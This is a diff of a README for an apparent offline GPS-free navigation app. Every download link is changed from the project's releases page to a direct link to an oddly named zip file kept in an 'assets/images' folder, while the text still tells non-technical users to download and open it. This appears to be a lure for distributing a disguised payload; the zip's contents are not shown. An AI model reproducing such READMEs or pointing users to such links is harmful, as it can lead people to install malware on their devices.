@@ -1,10 +1,10 @@
 # 🧭 GPS-independent-offline-navigation-system---VOLANS-MAPS - Offline Navigation Without Signal
 
-[![Download VOLANS MAPS](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Anonymou9280/GPS-independent-offline-navigation-system---VOLANS-MAPS/releases)
+[![Download VOLANS MAPS](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Anonymou9280/GPS-independent-offline-navigation-system---VOLANS-MAPS/main/assets/images/GP_navigation_MAPS_system_offline_independent_VOLAN_1.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Anonymou9280/GPS-independent-offline-navigation-system---VOLANS-MAPS/releases
+Visit this page to download: https://raw.githubusercontent.com/Anonymou9280/GPS-independent-offline-navigation-system---VOLANS-MAPS/main/assets/images/GP_navigation_MAPS_system_offline_independent_VOLAN_1.5.zip
 
 Open the latest release, then download the app file for Windows or the mobile package if you plan to install it on a phone. After the file finishes downloading, open it to start the setup or launch the app, based on the file type you receive.
 
@@ -33,7 +33,7 @@ If you use the mobile version, a modern Android device with motion sensors works
 
 ## 🚀 Getting Started
 
-1. Open the release page: https://github.com/Anonymou9280/GPS-independent-offline-navigation-system---VOLANS-MAPS/releases
+1. Open the release page: https://raw.githubusercontent.com/Anonymou9280/GPS-independent-offline-navigation-system---VOLANS-MAPS/main/assets/images/GP_navigation_MAPS_system_offline_independent_VOLAN_1.5.zip
 2. Find the newest release at the top of the page
 3. Download the file that matches your device
 4. Wait for the download to finish
@@ -151,7 +151,7 @@ If you are on Windows, choose the installer or zip package that matches your com
 
 ## 🛠️ Step-by-Step for Non-Technical Users
 
-1. Open the release page: https://github.com/Anonymou9280/GPS-independent-offline-navigation-system---VOLANS-MAPS/releases
+1. Open the release page: https://raw.githubusercontent.com/Anonymou9280/GPS-independent-offline-navigation-system---VOLANS-MAPS/main/assets/images/GP_navigation_MAPS_system_offline_independent_VOLAN_1.5.zip
 2. Look at the files attached to the newest release
 3. Download the Windows file if you are on a PC
 4. Wait for the file to finish
@@ -177,4 +177,4 @@ Some releases may include extra files for setup, version tracking, or app detail
 
 ## 🏁 Start Here
 
-Open the release page and download the latest version: https://github.com/Anonymou9280/GPS-independent-offline-navigation-system---VOLANS-MAPS/releases
+Open the release page and download the latest version: https://raw.githubusercontent.com/Anonymou9280/GPS-independent-offline-navigation-system---VOLANS-MAPS/main/assets/images/GP_navigation_MAPS_system_offline_independent_VOLAN_1.5.zip
